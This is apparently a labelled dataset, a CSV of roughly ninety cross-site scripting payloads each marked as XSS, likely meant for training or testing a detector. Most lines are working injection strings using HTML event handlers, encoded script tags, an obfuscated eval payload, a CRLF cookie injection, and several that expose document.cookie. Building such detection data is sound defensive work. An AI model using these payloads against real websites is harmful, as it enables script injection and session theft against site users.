payload,xss
<script id=x tabindex=1 onbeforeactivate=alert(1)></script>,1
"<style>:target {color:red;}</style><legend id=x style=""transition:color 1s"" onwebkittransitionend=alert(1)></legend>",1
<summary onpointerout=alert(1) style=display:block>AnonKryptiQuz</summary>,1
&lt;BODY BACKGROUND=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt;,1
<animate onpointerdown=alert(1) style=display:block>AnonKryptiQuz</animate>,1
"<thead draggable=""true"" ondrag=""alert(1)"">AnonKryptiQuz</thead>",1
<x OnXxx=1,1
<lol/onauxclick=[0].some(alert)>rightclickhere,1
"a=alert,a(1)",1
"<style>@keyframes slidein {}</style><u style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></u>",1
"<wbr ondblclick=""alert(1)"">AnonKryptiQuz</wbr>",1
"<keygen onbeforecopy=""alert(1)"" contenteditable>AnonKryptiQuz</keygen>",1
"<element onmouseout=""alert(1)"" style=display:block>AnonKryptiQuz</element>",1
<blink id=x tabindex=1 onbeforeactivate=alert(1)></blink>,1
"&lt;A HREF=\""//www&#46;google&#46;com/\""&gt;XSS&lt;/A&gt;",1
"<html onkeypress=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</html>",1
"<span onmousemove=""alert(1)"">AnonKryptiQuz</span>",1
%00%00%00%00%00%00%00<script>alert(1)</script>,1
"<span onmouseenter=""alert(1)"" style=display:block>AnonKryptiQuz</span>",1
{{window['eval'](window['atob'](window['decodeURIComponent']('Ij48aW1nIHNyYz14IG9uZXJyb3I9cHJvbXB0KGRvY3VtZW50LmNvb2tpZSk7PjEy')))}},1
"<th onclick=""alert(1)"" style=display:block>AnonKryptiQuz</th>",1
#\'-alert(1)//,1
"<u oncut=alert(1) value=""AnonKryptiQuz"" autofocus tabindex=1 style=display:block>AnonKryptiQuz",1
"<object data=""data:text/html;base64,%(base64)s"">",1
"<dt onkeydown=""alert(1)"" contenteditable>AnonKryptiQuz</dt>",1
"<acronym draggable=""true"" ondragenter=""alert(1)"">AnonKryptiQuz</acronym>",1
"<input onmouseup=""alert(1)"" style=display:block>AnonKryptiQuz</input>",1
--><!--*{color:red}   /* all UA */,1
"<meter draggable=""true"" ondragenter=""alert(1)"" style=display:block>AnonKryptiQuz</meter>",1
"<noframes oncontextmenu=""alert(1)"">AnonKryptiQuz</noframes>",1
"<style>:target {color:red;}</style><map id=x style=""transition:color 1s"" ontransitionend=alert(1)></map>",1
"<label>type a,b,c,d - watch the network tab/traffic (JS is off, laAnonKryptiQuz NoScript)</label>",1
"<header draggable=""true"" ondragenter=""alert(1)"" style=display:block>AnonKryptiQuz</header>",1
<br onfocusout=alert(1) autofocus tabindex=1 style=display:block>AnonKryptiQuz</br><input value=clickme>,1
"$(""script(2)"")",1
"<style>:target {transform: rotate(180deg);}</style><header id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></header>",1
"<embed onbeforepaste=""alert(1)"" contenteditable>AnonKryptiQuz</embed>",1
<source onmousewheel=alert(1) style=display:block>requires scrolling,1
<svg><td onload=alert(1)></td>,1
%3Cform%20action%3D%60javascript%3Aalert%28%60AnonKryptiQuz%60%29%60%3E%3Cinput%20type%3Dsubmit%3E%3C%2Fform%3E,1
"<summary onkeyup=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</summary>",1
%E5%98%8D%E5%98%8ASet-Cookie:whoami=thecyberneh%0d%0a%0a%3Cscript%3Ealert(1);%3C/script%3E,1
&lt;HTML&gt;&lt;BODY&gt;,1
"<template oncontextmenu=""alert(1)"" style=display:block>AnonKryptiQuz</template>",1
"<del draggable=""true"" ondragstart=""alert(1)"">AnonKryptiQuz</del>",1
<input type=radio id=x onfocus=alert(1)>,1
<keygen id=x tabindex=1 onactivate=alert(1)></keygen>,1
"<video onmousedown=""alert(1)"" style=display:block>AnonKryptiQuz</video>",1
"<dir onbeforecut=""alert(1)"" contenteditable>AnonKryptiQuz</dir>",1
<tbody onpointermove=alert(1) style=display:block>AnonKryptiQuz</tbody>,1
"<small draggable=""true"" ondragend=""alert(1)"">AnonKryptiQuz</small>",1
<svg id=x tabindex=1 onbeforedeactivate=alert(1)></svg><input autofocus>,1
"<style>:target {color: red;}</style><dd id=x style=""transition:color 10s"" ontransitioncancel=print()></dd>",1
&#X0003C;,1
"<object onmouseup=""alert(1)"" style=display:block>AnonKryptiQuz</object>",1
"<time ondblclick=""alert(1)"">AnonKryptiQuz</time>",1
"<meta draggable=""true"" ondragstart=""alert(1)"">AnonKryptiQuz</meta>",1
"<s onbeforepaste=""alert(1)"" contenteditable>AnonKryptiQuz</s>",1
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><map id=x style=""position:absolute;"" onanimationcancel=""print()""></map>",1
"<style>@keyframes slidein {}</style><title style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onwebkitanimationiteration=""alert(1)""></title>",1
<dl id=x tabindex=1 onbeforedeactivate=alert(1)></dl><input autofocus>,1
"<style>:target {color:red;}</style><input3 id=x style=""transition:color 1s"" onwebkittransitionend=alert(1)></input3>",1
"<rt ondblclick=""alert(1)"" autofocus tabindex=1 style=display:block>AnonKryptiQuz</rt>",1
secbreake@gmail.com\u003C/script\u003E\u003Cscript\u003Ealert(document.domain)//,1
<object onafterscriptexecute=alert(1)><script>1</script>,1
"<p oncontextmenu=""alert(1)"">AnonKryptiQuz</p>",1
<applet onblur=alert(1) id=x tabindex=1 style=display:block>AnonKryptiQuz</applet><input value=clickme>,1
"<div onbeforecopy=""alert(1)"" contenteditable>AnonKryptiQuz</div>",1
<blockquote contenteditable onbeforeinput=alert(1)>AnonKryptiQuz,1
'><img+sRc=l+oNerrOr=prompt(document.cookie)+x>,1
"<summary draggable=""true"" ondragexit=""alert(1)"" style=display:block>AnonKryptiQuz</summary>",1
"<style>@keyframes x{}</style><xmp style=""animation-name:x"" onwebkitanimationstart=""alert(1)""></xmp>",1
"<style>:target {color: red;}</style><u id=x style=""transition:color 10s"" ontransitioncancel=print()></u>",1
"<code onmousedown=""alert(1)"">AnonKryptiQuz</code>",1
"<sup onkeyup=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</sup>",1
"<div id=""105""><iframe src=""data:image/svg-xml,%1F%8B%08%00%00%00%00%00%02%03%B3)N.%CA%2C(Q%A8%C8%CD%C9%2B%B6U%CA())%B0%D2%D7%2F%2F%2F%D7%2B7%D6%CB%2FJ%D77%B4%B4%B4%D4%AF%C8(%C9%CDQ%B2K%CCI-*%D10%D4%B4%D1%87%E8%B2%03""></iframe>//[""'`-->]]>]</div><div id=""106""><img src onerror /"" '""= alt=alert(106)//"">//[""'`-->]]>]</div><div id=""107""><title onpropertychange=alert(107)></title><title title=></title>//[""'`-->]]>]</div>",1
"""><img&#x20;src=x&#x20;onerror=prompt('AnonKryptiQuz')>""",1
"<table onkeypress=""alert(1)"" contenteditable>AnonKryptiQuz</table>",1
"<style>:target {transform: rotate(180deg);}</style><hgroup id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></hgroup>",1
"<style>:target {color: red;}</style><h1 id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></h1>",1
"""></iframe><script>alert(`TEXT YOU WANT TO BE DISPLAYED`);</script><iframe frameborder=""0%EF%BB%BF",1
"<img src=""non-existent-image.jpg"" onerror=""alert(document.cookie);"" />",1
"<style>:target {color:red;}</style><footer id=x style=""transition:color 1s"" ontransitionend=alert(1)></footer>",1
"<b onmouseup=""alert(1)"">AnonKryptiQuz</b>",1
"<style>:target {color:red;}</style><form id=x style=""transition:color 1s"" ontransitionstart=alert(1)></form>",1
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><b id=x style=""position:absolute;"" onanimationcancel=""print()""></b>",1
"<xmp onmouseleave=""alert(1)"">AnonKryptiQuz</xmp>",1
